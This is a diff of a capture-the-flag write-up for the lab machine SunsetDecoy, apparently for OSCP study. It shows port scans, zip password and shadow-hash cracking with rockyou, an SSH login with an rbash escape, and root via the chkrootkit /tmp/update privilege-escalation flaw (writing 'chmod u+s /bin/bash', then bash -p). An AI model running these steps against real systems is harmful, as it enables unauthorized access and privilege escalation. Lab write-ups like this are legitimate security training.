@@ -1,5 +1,5 @@
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -n 192.168.131.85 -p- --min-rate 1000 --max-retries 1 --reason -v
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 15:55 CDT
 Initiating Connect Scan at 15:55
@@ -21,7 +21,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 69.97 seconds
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -sV -n 192.168.131.85 -p 22,80 --min-rate 1000 --max-retries 1 --reason 
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 16:01 CDT
 Nmap scan report for 192.168.131.85
@@ -36,7 +36,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -sV -sC  -n 192.168.131.85 -p 22,80 --min-rate 1000 --max-retries 1 --reason 
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 16:01 CDT
 Nmap scan report for 192.168.131.85
@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# wget http://192.168.131.85/save.zip
 --2021-10-15 16:03:22--  http://192.168.131.85/save.zip
 Conectando con 192.168.131.85:80... conectado.
@@ -75,7 +75,7 @@ save.zip                            100%[=======================================
 ```
 
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# binwalk -e save.zip 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -90,7 +90,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ```
 
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' save.zip 
 
 
@@ -99,7 +99,7 @@ root@kali:/OSCPv3/offsec_pg/SunsetDecoy#
 ```
 
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# unzip save.zip 
 Archive:  save.zip
 [save.zip] etc/passwd password: 
@@ -112,7 +112,7 @@ Archive:  save.zip
 ```
 
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat hostname 
 60832e9f188106ec5bcc4eb7709ce592
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat hosts 
@@ -125,7 +125,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat sudoers 
 #
 # This file MUST be edited with the 'visudo' command as root.
@@ -157,7 +157,7 @@ root	ALL=(ALL:ALL) ALL
 ```
 
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# unshadow passwd shadow > hashes.txt
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
 Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
@@ -168,7 +168,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 server           (296640a3b825115a47b68fc44501c828)
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85
 296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
 Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -188,7 +188,7 @@ permitted by applicable law.
 -rbash: ftp: command not found
 ```
 
-```shell
+```console
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85 -t "bash --noprofile"
 296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
 bash: dircolors: command not found
@@ -202,16 +202,15 @@ honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  local.txt  ls  mkdir  user.txt
 f539d346fd63f9aeda807814485edca1
 ```
 
-```shell
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
 PATH:/home/296640a3b825115a47b68fc44501c828/
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH="/bin:$PATH"
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
 296640a3b825115a47b68fc44501c828
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ 
 ```
 
-```shell
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ file honeypot.decoy
 honeypot.decoy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c2d7512e6f628f98adb080abd295115cc9e0c2f, not stripped
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
@@ -231,7 +230,7 @@ Option selected:5
 ```
 
 
-```shell
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ more process.sh 
 #!/bin/bash
 
@@ -249,7 +248,7 @@ done
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x process.sh 
 ```
 
-```shell
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy
 --------------------------------------------------
 
@@ -268,7 +267,8 @@ Option selected:5
 The AV Scan will be launched in a minute or less.
 --------------------------------------------------
 ```
-```shell
+
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./process.sh 
 < ./honeypot.decoy
 < sh -c /usr/sbin/service apache2 status
@@ -289,7 +289,7 @@ The AV Scan will be launched in a minute or less.
 ```
 https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/
 
-```shell
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo 'chmod u+s /bin/bash' > /tmp/update
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod 777 /tmp/update
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
@@ -334,7 +334,7 @@ The AV Scan will be launched in a minute or less.
 > [kworker/u2:2-events_unbound]
 ```
 
-```shell 
+```console
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/bash -p
 bash-5.0# whoami
 root
